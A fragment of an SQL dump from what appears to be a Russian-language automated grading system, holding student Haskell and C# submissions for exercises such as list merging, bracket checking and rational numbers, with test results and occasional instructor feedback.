(3347, 95, '44060', '2012-11-10 17:03:46', 1, 'public static bool allDifferent(int[] a)\r\n		{\r\n		return allDifferent1(a, 0, t => true);\r\n		}\r\n		\r\npublic static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n		{\r\n		int x = a[from];\r\n		if (!cond(x))\r\n			{return false;} \r\n		if (from == a.Length)\r\n			{ return true;}\r\n		else\r\n			{\r\n			return allDifferent1(a, from + 1, t => cond(t) && t != x);\r\n			}\r\n		}\r\n		', '<br/>Тесты успешно пройдены!'),
(3348, 96, '44060', '2012-11-10 17:14:42', 1, '		public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n		{\r\n		IEnumerator<int> aGE = a.GetEnumerator();\r\n		IEnumerator<int> bGE = b.GetEnumerator();\r\n		bool aMN = aGE.MoveNext();\r\n		bool bMN = bGE.MoveNext();\r\n			while (true)\r\n			{\r\n			if (!aMN && bMN)\r\n				{\r\n				yield return bGE.Current;\r\n				while (bGE.MoveNext())\r\n					{yield return bGE.Current;}\r\n					yield break;\r\n				} else if (aMN && !bMN)\r\n				{\r\n				yield return aGE.Current;\r\n				while (aGE.MoveNext())\r\n					{yield return aGE.Current;}\r\n					yield break;\r\n				} else if (aMN && bMN)\r\n				{\r\n				int x = aGE.Current;\r\n				int y = bGE.Current;\r\n				if (x > y)\r\n					{\r\n					bMN = bGE.MoveNext();\r\n					yield return y;\r\n					} else if (x == y) \r\n					{\r\n					aMN = aGE.MoveNext();\r\n					bMN = bGE.MoveNext();\r\n					yield return x;\r\n					} else \r\n					{\r\n					aMN = aGE.MoveNext();\r\n					yield return x;\r\n					}\r\n				} else\r\n				{yield break;}\r\n			}\r\n		}\r\n', '<br/>Тесты успешно пройдены!'),
(3349, 91, '3431532', '2012-11-10 17:45:17', 1, 'merge (x:xs) (y:ys) | x==y = x:(merge xs ys)\r\nmerge (x:xs) (y:ys) | x>y = y:(merge (x:xs) ys)\r\nmerge (x:xs) (y:ys) | x<y = x:(merge xs (y:ys))\r\nmerge [] y = y\r\nmerge x [] = x\r\nmerge [] [] = []', '<br/>Тесты успешно пройдены!'),
(3350, 97, 'tonyo', '2012-11-10 18:07:13', 1, 'checkBrackets xs = checkBrackets1 xs ""\r\n                \r\nop '')'' = ''(''\r\nop '']'' = ''[''\r\n\r\ncheckBrackets1 xs stack\r\n  | xs == "" = (stack == "")\r\n  | elem hxs "[(" = checkBrackets1 txs (hxs:stack)\r\n  | elem hxs "])" = if stack == "" || hst /= op hxs\r\n                    then False\r\n                    else checkBrackets1 txs tst\r\n  where hxs = head xs; txs = tail xs;\r\n        hst = head stack; tst = tail stack\r\n', '<br/>Тесты успешно пройдены!'),
(3351, 82, '63706456', '2012-11-10 18:09:18', 0, 'countDifferentVars _ [] = 0\r\ncountDifferentVars xs ([c]:ys) = 1 + (countDifferentVars xs $ filter ([x] -> not (x `elem` comp)) ys)\r\n				 where comp = component c xs\r\n\r\ncomponent c graph = (c:(componentRec (x -> x == c) graph))\r\ncomponentRec p [] = []\r\ncomponentRec p (([x],[y]):xs) 	| p x = if p y 	then componentRec p xs \r\n					else y: (componentRec (z -> (z == y) || (p z)) xs)\r\n				| p y = x: (componentRec (z -> (z == x) || (p z)) xs)\r\n				| otherwise = componentRec p xs', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(3352, 82, '63706456', '2012-11-10 18:10:44', 0, ' \r\ncountDifferentVars _ [] = 0\r\ncountDifferentVars xs (c:ys) = 1 + (countDifferentVars xs $ filter (x -> not (x `elem` comp)) ys)\r\n				 where comp = component c xs\r\n\r\n\r\ncomponent c graph = (c:(componentRec (x -> x == c) graph))\r\n\r\ncomponentRec p [] = []\r\ncomponentRec p ((x,y):xs) 	| p x = if p y 	then componentRec p xs \r\n					else y: (componentRec (z -> (z == y) || (p z)) xs)\r\n				| p y = x: (componentRec (z -> (z == x) || (p z)) xs)\r\n				| otherwise = componentRec p xs', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3353, 97, '3431532', '2012-11-10 18:20:56', 1, 'checkBrackets x = check x []\r\n\r\ncheck (x:xs) (y:ys) | x=='')'' && y==''('' = check xs ys\r\ncheck (x:xs) (y:ys) | x=='']'' && y==''['' = check xs ys\r\ncheck (x:xs) y = check xs (x:y)\r\n\r\ncheck "" "" = True\r\ncheck _ x | length x > 0 = False', '<br/>Тесты успешно пройдены!'),
(3354, 82, '63706456', '2012-11-10 18:59:25', 1, 'countDifferentVars _ [] = 0\r\ncountDifferentVars xs (c:ys) = 1 + (countDifferentVars xs $ filter (x -> not (x `elem` comp)) ys)\r\n				 where comp = component c xs\r\n\r\n\r\ncomponent c graph = (c:(componentRec (x -> x == c) graph))\r\n\r\ncomponentRec p [] = []\r\ncomponentRec p ((x,y):xs) 	| p x = if p y 	then componentRec p xs \r\n					else y: (componentRec (z -> (z == y) || (p z)) xs)\r\n				| p y = x: (componentRec (z -> (z == x) || (p z)) xs)\r\n				| otherwise = if or (map ((x,y)-> p x || p y) xs) then componentRec p (xs ++ [(x,y)]) else []', '<br/>Тесты успешно пройдены!'),
(3355, 89, '533223', '2012-11-10 20:06:37', 1, 'data Tree a = Empty| Node a (Tree a) (Tree a) deriving Show\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = f x lres rres\r\n				where \r\n					lres = foldTree f e l\r\n					rres = foldTree f e r\r\n\r\nflatten tree = foldTree (x l r-> [x]++l++r) [] tree', '<br/>Тесты успешно пройдены!'),
(3356, 82, 'hasp', '2012-11-10 21:29:45', 0, 'import Data.Set  hiding (filter, map)\r\nimport Data.List hiding (delete, insert, union) \r\n\r\nmyS = "12345"\r\n\r\nfactorOut [] acc = acc\r\nfactorOut ((l,r):xs) acc = case (find (s -> (member l s) || (member r s) ) (elems acc)) of \r\n								{(Just s) -> factorOut xs (insert (insert r (insert l s)) (delete s acc)); (Nothing) -> factorOut xs (insert (insert r (singleton l)) acc)}\r\n\r\nisInt a b = (size (intersection a b)) > 0\r\nunionAllI e s = foldr (l (acc, notInt) ->  if isInt acc l then (union acc l, notInt) else (acc, l : notInt) ) (e, []) s --int / not int\r\nunionAll [] = []\r\nunionAll (x:xs) = let (a,b) = unionAllI x xs in a : (unionAll b)\r\n			\r\n								\r\ncountDifferentVars a l = let cls = fromList(unionAll (elems (factorOut a empty))) in \r\n						 let k = foldl (acc x -> case (find (y -> member x y) (elems acc)) of {(Just s) -> (insert (insert myS s)(delete s acc)); (Nothing) -> insert (insert myS (singleton x)) acc}) cls l in\r\n						 length (filter (member myS) (elems k))', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3357, 82, 'hasp', '2012-11-10 21:37:04', 1, 'import Data.Set  \r\nimport qualified Data.List (find,filter) \r\n\r\nmyS = "12345"\r\n\r\nfactorOut [] acc = acc\r\nfactorOut ((l,r):xs) acc = case (Data.List.find (s -> (member l s) || (member r s) ) (elems acc)) of \r\n								{(Just s) -> factorOut xs (insert (insert r (insert l s)) (delete s acc)); (Nothing) -> factorOut xs (insert (insert r (singleton l)) acc)}\r\n\r\nisInt a b = (size (intersection a b)) > 0\r\nunionAllI e s = foldr (l (acc, notInt) ->  if isInt acc l then (union acc l, notInt) else (acc, l : notInt) ) (e, []) s\r\nunionAll [] = []\r\nunionAll (x:xs) = let (a,b) = unionAllI x xs in a : (unionAll b)\r\n			\r\n								\r\ncountDifferentVars a l = let cls = fromList(unionAll (elems (factorOut a empty))) in \r\n						 let k = foldl (acc x -> case (Data.List.find (y -> member x y) (elems acc)) of {(Just s) -> (insert (insert myS s)(delete s acc)); (Nothing) -> insert (insert myS (singleton x)) acc}) cls l in\r\n						 length (Data.List.filter (member myS) (elems k))', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3358, 91, 'hasp', '2012-11-10 21:58:01', 1, 'merge [] r = r\r\nmerge l [] = l\r\nmerge l@(lx:lxs) r@(rx:rxs) = if (lx == rx) then lx:(merge lxs rxs) else if lx < rx then lx:(merge lxs r) else  rx:(merge l rxs)', '<br/>Тесты успешно пройдены!'),
(3359, 90, 'hasp', '2012-11-10 21:58:34', 1, 'import Data.List\r\n\r\nfindSame [] = Nothing \r\nfindSame (x:xs) = case find (==x) xs of {s@(Just _) -> s; _ -> findSame xs}\r\n', '<br/>Тесты успешно пройдены!'),
(3360, 93, 'hasp', '2012-11-10 22:24:52', 1, '   --- ОК, хорошо. Я знаю способ немного проще (с завяыванием в узел), при котором и для\r\n   --- WinHugs все работает и для 10000. (Правда, вылетает для 100000, например)\r\n   --- Но ОК, это мы разберем.\r\nimport qualified Data.List \r\nimport Data.Set\r\n--с GHC все нормально работает для 10000 (и куда быстрее 30сек), но в WinHugs вылетает Stack Overflow\r\nham = snd (Data.List.mapAccumL (acc _ -> let (a,b) = deleteFindMin acc in (insert (a*3) (insert (a*10) b), a)) (singleton 1) [1..])', '<br/>Тесты успешно пройдены!'),
(3361, 81, '442421', '2012-11-11 07:33:26', 1, 'lst239 = 2:3:9:[ 10*x+y | x<-lst239, y<-[2,3,9]]', '<br/>Тесты успешно пройдены!'),
(3362, 82, '442421', '2012-11-11 08:17:49', 0, '\r\ncountDifferentVars eqs vrs = countDifferentVars'' eqs vrs 0\r\n\r\ncountDifferentVars'' [] vrs r = r + length (removeRepits vrs)\r\ncountDifferentVars'' ((a,b):xs) vrs r = if (contains vrs a) && (contains vrs b) \r\n		then countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r+1)\r\n		else countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) r\r\n\r\n\r\ncontains x a = length (filter (==a) x) > 0\r\n\r\nremoveRepits x = removeRepits'' x []\r\nremoveRepits'' [] r = r\r\nremoveRepits'' (x:xs) r = removeRepits'' (filter (/=x) xs) (x:r) \r\n\r\n \r\n\r\n', 'Выражение имеет неправильное значение: countDifferentVars [([''x''],[''y''])] [[''x'']]'),
(3363, 83, '442421', '2012-11-11 08:34:59', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _21._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n\r\n\r\n        static IEnumerable<int> Lst239()\r\n\r\n        {\r\n\r\n            yield return 2;\r\n\r\n            yield return 3;\r\n\r\n            yield return 9;\r\n\r\n\r\n\r\n            foreach (int i in Lst239())\r\n\r\n            {\r\n\r\n                yield return i * 10 + 2;\r\n\r\n                yield return i * 10 + 3;\r\n\r\n                yield return i * 10 + 9;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            IEnumerator<int> en = Lst239().GetEnumerator();\r\n\r\n            for (int i = 0; i < 100; ++i)\r\n\r\n            {\r\n\r\n                en.MoveNext();\r\n\r\n                Console.Write(en.Current+" ");\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3364, 84, '442421', '2012-11-11 08:44:25', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _21._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n\r\n\r\n        static IEnumerable<double> Iterate (double a,Func<double,double> f)\r\n\r\n        {\r\n\r\n            double ret = a;\r\n\r\n            for(;;)\r\n\r\n            {\r\n\r\n                yield return ret;\r\n\r\n                ret = f(ret);\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (x > 1000000)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n            Console.Clear();\r\n\r\n\r\n\r\n            int i = 0;\r\n\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (i++ == 100)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3365, 82, '3742311', '2012-11-11 09:07:02', 1, 'countDifferentVarsInList l = length (foldl (s x -> if (any (p -> p == x) s) then s else x:s) [] l)\r\n\r\ncountDifferentVars [] v = countDifferentVarsInList v\r\ncountDifferentVars ((a, b):t) v = countDifferentVars (map ((m, n) -> if m == a then (b, n) else if n == a then (m, b) else (m, n)) t) (map (x -> if x == a then b else x) v)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3366, 82, '533223', '2012-11-11 09:09:30', 2, '--А каким образом можно можно устроить сравнение между объектами типа "x".\r\n   --- С помощью ==.\r\n   --- На самом деле, вы можете считать, что там не строки, а числа (и в большинстве тестов там действительно числа)\r\n   --- Если хотите, можете попробовать прислать решение в течении понедельника. Я приму, хоть это и немного позже срока.', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3367, 81, '3742311', '2012-11-11 09:22:44', 1, 'lst239 = 2:3:9:(foldr (x s -> (x * 10 + 2):(x * 10 + 3):(x * 10 + 9):s) [] lst239)', '<br/>Тесты успешно пройдены!'),
(3368, 82, '442421', '2012-11-11 09:23:08', 0, '\r\ncountDifferentVars eqs vrs = countDifferentVars'' eqs vrs 0 []\r\n\r\ncountDifferentVars'' [] vrs r asc = r + length (removeRepits vrs)\r\ncountDifferentVars'' ((a,b):xs) vrs r asc = if ((contains vrs a) || (contains vrs b)) && (checkAssociation a b asc)\r\n		then countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r+1) (addAssociation a b asc)\r\n		else countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) r (addAssociation a b asc)\r\n\r\n\r\ncontains x a = length (filter (==a) x) > 0\r\n\r\nremoveRepits x = removeRepits'' x []\r\nremoveRepits'' [] r = r\r\nremoveRepits'' (x:xs) r = removeRepits'' (filter (/=x) xs) (x:r) \r\n\r\n\r\ncheckAssociation a b [] = True\r\ncheckAssociation a b (x:xs) = not ((contains x a) || (contains x b)) && (checkAssociation a b xs)\r\n\r\n\r\naddAssociation a b x = addAssociation'' a b x []\r\naddAssociation'' a b [] r = ([a,b]):r\r\naddAssociation'' a b (x:xs) r= if (contains x a) then ((b:x):xs)++r else\r\n			       if (contains x b) then ((a:x):xs)++r\r\n                                 else addAssociation'' a b xs (x:r)\r\n ', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3369, 83, '3742311', '2012-11-11 09:52:41', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Task211\r\n{\r\n    public static class Program\r\n    {\r\n        public static IEnumerable<int> Lst239()\r\n        {\r\n            yield return 2;\r\n            yield return 3;\r\n            yield return 9;\r\n\r\n            foreach (int i in Lst239())\r\n            {\r\n                yield return i * 10 + 2;\r\n                yield return i * 10 + 3;\r\n                yield return i * 10 + 9;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int c = 0;\r\n\r\n            foreach (int i in Lst239())\r\n            {\r\n                Console.WriteLine(i);\r\n\r\n                if (c++ > 100)\r\n                {\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3370, 84, '3742311', '2012-11-11 10:05:39', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace Task212\r\n{\r\n    public static class Program\r\n    {\r\n        public static IEnumerable<double> Iterate(double x, Func<double, double> f)\r\n        {\r\n            for (double last = x; ; last = f(last))\r\n            {\r\n                yield return last;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int c = 0;\r\n\r\n            foreach (double d in Iterate(2, x => x * 2))\r\n            {\r\n                Console.WriteLine(d);\r\n\r\n                if (c++ > 100)\r\n                {\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3371, 88, '3742311', '2012-11-11 10:07:13', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = (N 1)\r\ndiff (N c) = (N 0)\r\ndiff (Add e1 e2) = (Add (diff e1) (diff e2))\r\ndiff (Mult e1 e2) = (Add (Mult (diff e1) e2) (Mult e1 (diff e2)))', '<br/>Тесты успешно пройдены!'),
(3372, 97, '3742311', '2012-11-11 10:23:26', 0, 'checkBracketsTmp [] [] = True\r\n\r\ncheckBracketsTmp [] s = False\r\n\r\ncheckBracketsTmp ('')'':t) [] = False\r\ncheckBracketsTmp ('']'':t) [] = False\r\n\r\ncheckBracketsTmp ('')'':t1) (''['':t2) = False\r\ncheckBracketsTmp ('']'':t1) [''('':t2] = False\r\n\r\ncheckBracketsTmp ('')'':t1) (''('':t2) = checkBracketsTmp t1 t2\r\ncheckBracketsTmp ('']'':t1) [''['':t2] = checkBracketsTmp t1 t2\r\n\r\ncheckBracketsTmp (h:t1) t2 = checkBracketsTmp t1 (h:t2)\r\n\r\ncheckBrackets s = checkBracketsTmp s []', 'Не удалось вычислить выражение "checkBrackets [''('',''['','']'','')'']", проверьте правильность синтаксиса'),
(3373, 97, '3742311', '2012-11-11 10:27:54', 1, 'checkBracketsTmp [] [] = True\r\n\r\ncheckBracketsTmp [] s = False\r\n\r\ncheckBracketsTmp ('')'':t) [] = False\r\ncheckBracketsTmp ('']'':t) [] = False\r\n\r\ncheckBracketsTmp ('')'':t1) (''['':t2) = False\r\ncheckBracketsTmp ('']'':t1) (''('':t2) = False\r\n\r\ncheckBracketsTmp ('')'':t1) (''('':t2) = checkBracketsTmp t1 t2\r\ncheckBracketsTmp ('']'':t1) (''['':t2) = checkBracketsTmp t1 t2\r\n\r\ncheckBracketsTmp (h:t1) t2 = checkBracketsTmp t1 (h:t2)\r\n\r\ncheckBrackets s = checkBracketsTmp s []', '<br/>Тесты успешно пройдены!'),
(3374, 82, '442421', '2012-11-11 10:43:19', 0, '\r\n\ncountDifferentVars eqs vrs = countDifferentVars'' eqs vrs 0 []\r\n\n\r\n\ncountDifferentVars'' [] vrs r asc = r + length (removeRepits vrs)\r\n\ncountDifferentVars'' ((a,b):xs) vrs r asc = if ((contains vrs a) || (contains vrs b)) && (checkAssociation a b asc)\r\n\n		then countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r+1 - addAssociation1 a b asc) (addAssociation a b asc)\r\n\n		else countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r - addAssociation1 a b asc) (addAssociation a b asc)\r\n\n\r\n\n\r\n\ncontains x a = length (filter (==a) x) > 0\r\n\n\r\n\nremoveRepits x = removeRepits'' x []\r\n\nremoveRepits'' [] r = r\r\n\nremoveRepits'' (x:xs) r = removeRepits'' (filter (/=x) xs) (x:r) \r\n\n\r\n\n\r\n\ncheckAssociation a b [] = True\r\n\ncheckAssociation a b (x:xs) = not ((contains x a) || (contains x b)) && (checkAssociation a b xs)\r\n\n\r\n\n\r\n\naddAssociation a b x = mergeAssociation2 (addAssociation'' a b x [])\r\n\naddAssociation'' a b [] r = ([a,b]):r\r\n\naddAssociation'' a b (x:xs) r= if (contains x a) then ((b:x):xs)++r else\r\n\n			       if (contains x b) then ((a:x):xs)++r\r\n\n                                 else addAssociation'' a b xs (x:r)\r\n\n\r\n\naddAssociation1 a b x =addAssociation1'' (associationsLength x) (associationsLength (addAssociation a b x))\r\n\naddAssociation1'' l1 l2 = if l2==l1 then 2 else 0\r\n\n\r\n\nassociationsLength x = sum (map (length) x)\r\n\n\r\n\nmergeAssociation2 x = mergeAssociation2'' x []\r\n\nmergeAssociation2'' [] r = r\r\n\nmergeAssociation2'' (x:xs) r = mergeAssociation2'' (filter (	->not(isCrossing t (doMerge (x:xs)))) xs) ((doMerge(x:xs)):r)\r\n\n\r\n\nisCrossing [] y = False\r\n\nisCrossing (x:xs) y = (contains y x) || isCrossing xs y \r\n\n\r\n\ndoMerge (x:xs) = removeRepits \r\n\n			(\r\n\n				foldl (a b->if (isCrossing a b) then (a ++ b) else a) x xs\r\n\n			) \r\n\n\r\n\n \r\n\n\r\n\n \r\n\n\r\n\n\n', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3375, 82, '442421', '2012-11-11 10:45:45', 0, '\r\ncountDifferentVars eqs vrs = countDifferentVars'' eqs vrs 0 []\r\n\r\ncountDifferentVars'' [] vrs r asc = r + length (removeRepits vrs)\r\ncountDifferentVars'' ((a,b):xs) vrs r asc = if ((contains vrs a) || (contains vrs b)) && (checkAssociation a b asc)\r\n		then countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r+1 - addAssociation1 a b asc) (addAssociation a b asc)\r\n		else countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r - addAssociation1 a b asc) (addAssociation a b asc)\r\n\r\n\r\ncontains x a = length (filter (==a) x) > 0\r\n\r\nremoveRepits x = removeRepits'' x []\r\nremoveRepits'' [] r = r\r\nremoveRepits'' (x:xs) r = removeRepits'' (filter (/=x) xs) (x:r) \r\n\r\n\r\ncheckAssociation a b [] = True\r\ncheckAssociation a b (x:xs) = not ((contains x a) || (contains x b)) && (checkAssociation a b xs)\r\n\r\n\r\naddAssociation a b x = mergeAssociation2 (addAssociation'' a b x [])\r\naddAssociation'' a b [] r = ([a,b]):r\r\naddAssociation'' a b (x:xs) r= if (contains x a) then ((b:x):xs)++r else\r\n			       if (contains x b) then ((a:x):x', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3376, 82, '442421', '2012-11-11 10:48:04', 2, 'countDifferentVars eqs vrs = countDifferentVars'' eqs vrs 0 []\r\ncountDifferentVars'' [] vrs r asc = r + length (removeRepits vrs)\r\ncountDifferentVars'' ((a,b):xs) vrs r asc = if ((contains vrs a) || (contains vrs b)) && (checkAssociation a b asc) then countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r+1 - addAssociation1 a b asc) (addAssociation a b asc)\r\nelse countDifferentVars'' xs (filter (x->x/=a && x/=b) vrs) (r - addAssociation1 a b asc) (addAssociation a b asc)\r\ncontains x a = length (filter (==a) x) > 0\r\nremoveRepits x = removeRepits'' x []\r\nremoveRepits'' [] r = r\r\nremoveRepits'' (x:xs) r = removeRepits'' (filter (/=x) xs) (x:r) \r\ncheckAssociation a b [] = True\r\ncheckAssociation a b (x:xs) = not ((contains x a) || (contains x b)) && (checkAssociation a b xs)\r\naddAssociation a b x = mergeAssociation2 (addAssociation'' a b x [])\r\naddAssociation'' a b [] r = ([a,b]):r\r\naddAssociation'' a b (x:xs) r= if (contains x a) then ((b:x):xs)++r else if (contains x b) then ((a:x):xs)++r else addAssociati', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3377, 85, '3742311', '2012-11-11 11:34:31', 2, '  --- У вас класс Number неправильно называется, и < kgbcfy не в том класее, он дб не в Eq\r\ndata Ration = Rat Integer Integer\r\n\r\ninstance Number Ration where\r\n  (Rat a b) + (Rat c d) = (a * d + b * c) / (b * d)\r\n\r\ninstance Eq Ration where\r\n  (Rat a b) == (Rat c d) = a * d == b * c\r\n  (Rat a b) < (Rat c d) = a * d < b * c\r\n\r\ninstance Show Ration where\r\n  show (Rat a b) = (show a) ++ (''/'':(show b))', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3378, 81, '4169333', '2012-11-11 12:03:09', 1, 'lst2390 l n = let \r\n                  l1= map (x-> 2*10^n+x) l\r\n                  l2= map (x-> 3*10^n+x) l\r\n                  l3= map (x-> 9*10^n+x) l\r\n	          l4= l1 ++ l2 ++ l3\r\n              in l4 ++ (lst2390 l4 (n+1))\r\n\r\nlst239 =lst2390 [0] 0', '<br/>Тесты успешно пройдены!'),
(3379, 85, '419046', '2012-11-11 14:03:00', 0, 'data Ratio = Rat Integer Integer\r\n\ninstance Num Ratio where\r\n\n    (Rat a1 b1) + (Rat a2 b2) = Rat ((a1 * b2) + (a2 * b1)) (b2 * b1)\r\n\ninstance Ord Ratio where\r\n\n    (Rat a1 b1) < (Rat a2 b2) = if (((a1 * b2) - (a2 * b1)) < 0) then True\r\n\n                                 else False\r\n\ninstance Show Ratio where\r\n\n    show (Rat a1 b1) = show a1 ++ "/" ++ show b1\r\n\ninstance Eq Ratio where\r\n\n    (Rat a1 b1) == (Rat a2 b2) = a1 == a2 && b1 == b2\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3380, 82, '4837959', '2012-11-11 15:24:01', 0, 'countDifferentVars es vs = length $ differentVars es vs\n\n\n\ndifferentVars es vs = differentVars'' es vs [] []\n\ndifferentVars'' _ [] diffVars _ = diffVars\n\ndifferentVars'' es (v:vs) diffVars duppVars = if all (/= v) duppVars then\n\n                                                 differentVars'' es vs (v:diffVars) (equalVars v es ++ duppVars)\n\n                                             else\n\n                                                 differentVars'' es vs diffVars duppVars\n\n-- returns a list of variables which are equal to v\n\nequalVars v es = equalVars'' v es es [v]\n\nequalVars'' _ _ [] eqVars = eqVars\n\nequalVars'' v equations (e:es) eqVars = let\n\n                                           equalTo = if v == fst(e) then\n\n                                                         snd(e)\n\n                                                     else\n\n                                                         if v == snd(e) then\n\n                                                             fst(e)\n\n                                                         else\n\n                                                             ""\n\n                                           newEqVars = if equalTo /= "" && all (/= equalTo) eqVars then\n\n                                                           equalVars'' equalTo equations equations (equalTo:eqVars)\n\n                                                       else\n\n                                                           eqVars\n\n                                       in equalVars'' v equations es newEqVars\n\n\n', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(3381, 82, '4837959', '2012-11-11 15:29:46', 1, '-- !!! Считаю некорректным входной тест \r\n\r\n-- "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]"\r\n\r\n-- так как в условии было сказано, что система равенств представляется как список пар строк.\r\n   --- Вы правы, просто система тестирования не принимает строки в тестах, как выяснилось(( \r\n\r\n\r\ncountDifferentVars es vs = length $ differentVars es vs\r\n\r\n\r\n\r\ndifferentVars es vs = differentVars'' es vs [] []\r\n\r\ndifferentVars'' _ [] diffVars _ = diffVars\r\n\r\ndifferentVars'' es (v:vs) diffVars duppVars = if all (/= v) duppVars then\r\n\r\n                                                 differentVars'' es vs (v:diffVars) (equalVars v es ++ duppVars)\r\n\r\n                                             else\r\n\r\n                                                 differentVars'' es vs diffVars duppVars\r\n\r\n-- returns a list of variables which are equal to v\r\n\r\nequalVars v es = equalVars'' v es es [v]\r\n\r\nequalVars'' _ _ [] eqVars = eqVars\r\n\r\nequalVars'' v equations (e:es) eqVars = let\r\n\r\n                                           equalTo = if v == fst(e) then\r\n\r\n                                                         snd(e)\r\n\r\n                                                     else\r\n\r\n                                                         if v == snd(e) then\r\n\r\n                                                             fst(e)\r\n\r\n                                                         else\r\n\r\n                                                             ""\r\n\r\n                                           newEqVars = if equalTo /= "" && all (/= equalTo) eqVars then\r\n\r\n                                                           equalVars'' equalTo equations equations (equalTo:eqVars)\r\n\r\n                                                       else\r\n\r\n                                                           eqVars\r\n\r\n                                       in equalVars'' v equations es newEqVars\r\n\r\n\r\n', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(3382, 82, '83813', '2012-11-11 15:48:18', 0, 'import Data.List\n\norder eqls = map (eq -> if (fst eq <= snd eq) then eq else (snd eq, fst eq)) eqls\n\nrefine eqls = sort $ order eqls\n\ntransform vars eql = map (x -> if (x == fst eql) then snd eql else x) vars\n\ncountDifferentVars eqls vars = length $ nub $ foldl transform vars (refine eqls)\n\n\n\n\n', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3383, 85, '419046', '2012-11-11 16:17:25', 0, 'data Ratio = Rat Integer Integer\r\n\ninstance Num Ratio where\r\n\n    (Rat a1 b1) + (Rat a2 b2) = Rat ((a1 * b2) + (a2 * b1)) (b2 * b1)\r\n\ninstance Ord Ratio where\r\n\n    (Rat a1 b1) < (Rat a2 b2) = if (((a1'' * b2'') - (a2'' * b1'')) < 0) then True\r\n\n                                else False\r\n\n                                  where a1'' = (a1 * b1) `div` (abs b1)\r\n\n                                        b1'' = abs (a1 * b1) `div` (abs b1)\r\n\n                                        a2'' = (a2 * b2) `div` abs b2\r\n\n                                        b2'' = abs (a2 * b2) `div` (abs b2)\r\n\ninstance Show Ratio where\r\n\n    show (Rat a1 b1) = if ((a1 * b1) > 0) then show a1 ++ "/" ++ show b1\r\n\n                       else "-" ++ show (abs a1) ++ "/" ++ show (abs b1)\r\n\ninstance Eq Ratio where\r\n\n    (Rat a1 b1) == (Rat a2 b2) = a1 == a2 && b1 == b2\n', 'Выражение имеет неправильное значение: Rat 1 3 < Rat 4 5'),
